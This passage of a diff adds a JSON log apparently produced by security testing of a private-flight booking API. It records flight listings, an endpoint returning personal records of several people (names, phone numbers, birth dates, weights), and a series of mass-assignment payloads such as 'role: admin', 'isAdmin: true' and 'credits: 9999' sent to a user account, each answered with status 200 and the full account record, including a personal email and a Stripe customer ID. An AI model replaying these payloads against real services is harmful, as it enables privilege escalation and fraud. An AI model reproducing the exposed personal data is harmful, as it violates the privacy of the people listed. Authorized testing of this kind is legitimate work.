+            "departDateTimeLocal": "2025-11-04T11:45",
+            "deletedAt": null,
+            "updatedAt": 1762217067660,
+            "closeoutDateTime": "2025-11-03T23:40:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/cc499635-a972-42e7-a726-65d3d29f04b4.png",
+            "isConfirmedByWinner": false,
+            "status": 2,
+            "numberOfEntrants": 0,
+            "tierClassification": "cabin+",
+            "winner": null,
+            "aircraft": {
+              "id": 113,
+              "tail": "N924PS",
+              "type": 15
+            },
+            "departAirport": {
+              "id": 23,
+              "name": "Salt Lake City International Airport",
+              "codeIcao": "KSLC",
+              "codeIata": "SLC",
+              "latitude": 40.785749,
+              "longitude": -111.979746,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Salt Lake City",
+              "provinceCode": "UT",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KSLC",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 217,
+              "name": "Casper-Natrona County International Airport",
+              "codeIcao": "KCPR",
+              "codeIata": "CPR",
+              "latitude": 42.908001,
+              "longitude": -106.463997,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Casper",
+              "provinceCode": "WY",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KCPR",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 670,
+              "name": "ATLANTIC AVIATION",
+              "uuid": "c9c7b451-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "385-715-7192",
+              "emailAddress": "slcfrontdesk@atlanticaviation.com",
+              "website": "http://www.atlanticaviation.com/location/slc",
+              "addressLine1": "369 N 2370 WEST",
+              "addressLine2": null,
+              "city": "SALT LAKE CITY",
+              "province": "Utah",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 743,
+              "name": "ATLANTIC AVIATION",
+              "uuid": "c9ccfe81-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "307-472-3400",
+              "emailAddress": "cprfrontdesk@atlanticaviation.com",
+              "website": "http://www.atlanticaviation.com/locations/cpr",
+              "addressLine1": "7956 FULLER ST.",
+              "addressLine2": null,
+              "city": "CASPER",
+              "province": "Wyoming",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-04T21:15:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          },
+          {
+            "id": 8792,
+            "uuid": "7c60b4b6-70a2-4968-b758-c5f549afd12e",
+            "departDateTime": "2025-11-04T17:46:00.000Z",
+            "departDateTimeLocal": "2025-11-04T12:46",
+            "deletedAt": null,
+            "updatedAt": 1762210828875,
+            "closeoutDateTime": "2025-11-03T23:00:00.000Z",
+            "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/bbf1c90b-6e07-4b59-9830-320bbf601031.png",
+            "isConfirmedByWinner": false,
+            "status": 2,
+            "numberOfEntrants": 0,
+            "tierClassification": "cabin+",
+            "winner": null,
+            "aircraft": {
+              "id": 142,
+              "tail": "N768BL",
+              "type": 13
+            },
+            "departAirport": {
+              "id": 885,
+              "name": "Leesburg Executive Airport",
+              "codeIcao": "KJYO",
+              "codeIata": null,
+              "latitude": 39.077999,
+              "longitude": -77.557503,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Leesburg",
+              "provinceCode": "VA",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": "http://www.leesburgva.gov/government/departments/airport",
+              "code": "KJYO",
+              "codeFaa": null
+            },
+            "arriveAirport": {
+              "id": 501,
+              "name": "Pitt Greenville Airport",
+              "codeIcao": "KPGV",
+              "codeIata": "PGV",
+              "latitude": 35.6352005,
+              "longitude": -77.38529968,
+              "addressLine1": null,
+              "addressLine2": null,
+              "city": "Greenville",
+              "provinceCode": "NC",
+              "postalCode": null,
+              "countryCode": "US",
+              "website": null,
+              "code": "KPGV",
+              "codeFaa": null
+            },
+            "departFbo": {
+              "id": 446,
+              "name": "KUHN JET CENTER",
+              "uuid": "c9c6dcb6-f001-11ed-82b1-1e8adba15a41",
+              "phoneNumber": "703-665-3000",
+              "emailAddress": "info@kuhnaviation.com",
+              "website": "https://www.kuhnaviation.com/jet-center/",
+              "addressLine1": "959 SYCOLIN RD.",
+              "addressLine2": null,
+              "city": "LEESBURG",
+              "province": "Virginia",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveFbo": {
+              "id": 746,
+              "name": "MORGANTOWN MUNICIPAL FBO",
+              "uuid": "00089e8c-5efe-48a9-9ad0-f453ad926580",
+              "phoneNumber": "304 296 2359",
+              "emailAddress": "fbomgw@morgantownwv.gov",
+              "website": null,
+              "addressLine1": "100 Hart Field Road Morgantown, WV 26505",
+              "addressLine2": null,
+              "city": "GREENVILLE",
+              "province": "NC",
+              "postalCode": null,
+              "countryCode": "US",
+              "airport": null
+            },
+            "arriveDateTime": "2025-11-04T20:16:00.000Z",
+            "userData": {
+              "action": "NO_ACTION"
+            }
+          }
+        ],
+        "pagination": {
+          "limit": 10,
+          "nextCursor": "eyJkZXBhcnREYXRlVGltZSI6IjIwMjUtMTEtMDRUMTc6NDY6MDAuMDAwWiIsImlkIjo4NzkyLCJsaW1pdCI6MTB9",
+          "total": 258,
+          "recentFlightsTotal": 59,
+          "recentFlightsLookbackDays": 7,
+          "pastFlightsLookbackDays": 30
+        }
+      }
+    },
+    {
+      "category": "baseline",
+      "test": "Current Flights",
+      "endpoint": "/v2/flight/current",
+      "status": 200,
+      "response": []
+    },
+    {
+      "category": "baseline",
+      "test": "Passenger Data",
+      "endpoint": "/v1/passenger",
+      "status": 200,
+      "response": []
+    },
+    {
+      "category": "baseline",
+      "test": "Person Data",
+      "endpoint": "/v1/person/",
+      "status": 200,
+      "response": [
+        {
+          "createdAt": 1712033928424,
+          "updatedAt": 1712033928424,
+          "id": 500,
+          "phoneNumber": "+17203944170",
+          "email": null,
+          "firstName": "Varun",
+          "middleName": "",
+          "lastName": "",
+          "dateOfBirth": null,
+          "weight": null,
+          "gender": null,
+          "user": 20254
+        },
+        {
+          "createdAt": 1714685311212,
+          "updatedAt": 1714685311212,
+          "id": 775,
+          "phoneNumber": "+13039076708",
+          "email": "",
+          "firstName": "Arjun",
+          "middleName": "",
+          "lastName": "Gosal",
+          "dateOfBirth": "1987-12-07",
+          "weight": 180,
+          "gender": "Male",
+          "user": 20254
+        },
+        {
+          "createdAt": 1715231549968,
+          "updatedAt": 1715378743257,
+          "id": 815,
+          "phoneNumber": "+18702246224",
+          "email": "",
+          "firstName": "Julian",
+          "middleName": "",
+          "lastName": "Jackson",
+          "dateOfBirth": "1996-08-15",
+          "weight": 110,
+          "gender": "Male",
+          "user": 20254
+        },
+        {
+          "createdAt": 1757720563083,
+          "updatedAt": 1757720563083,
+          "id": 2281,
+          "phoneNumber": "+19709855728",
+          "email": "",
+          "firstName": "Chauncey",
+          "middleName": "",
+          "lastName": "Barnett",
+          "dateOfBirth": "1989-02-16",
+          "weight": 240,
+          "gender": "Male",
+          "user": 20254
+        },
+        {
+          "createdAt": 1757720597940,
+          "updatedAt": 1757720597940,
+          "id": 2282,
+          "phoneNumber": "+18627661900",
+          "email": "",
+          "firstName": "Amory",
+          "middleName": "",
+          "lastName": "Creary",
+          "dateOfBirth": "1995-08-24",
+          "weight": 230,
+          "gender": "Male",
+          "user": 20254
+        },
+        {
+          "createdAt": 1757720630494,
+          "updatedAt": 1757720630494,
+          "id": 2283,
+          "phoneNumber": "",
+          "email": "",
+          "firstName": "Ashley",
+          "middleName": "",
+          "lastName": "Rager Trochez",
+          "dateOfBirth": "1997-02-04",
+          "weight": 150,
+          "gender": "Female",
+          "user": 20254
+        }
+      ]
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate credits",
+      "payload": {
+        "credits": 9999
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363637635,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate balance",
+      "payload": {
+        "balance": 9999
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363637966,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate referralCount",
+      "payload": {
+        "referralCount": 100
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363638336,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate referrals",
+      "payload": {
+        "referrals": 100
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363638700,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate subscriptionTier",
+      "payload": {
+        "subscriptionTier": "premium"
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363639042,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate membership",
+      "payload": {
+        "membership": "vip"
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363639378,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate role",
+      "payload": {
+        "role": "admin"
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363639695,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate isAdmin",
+      "payload": {
+        "isAdmin": true
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363640057,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
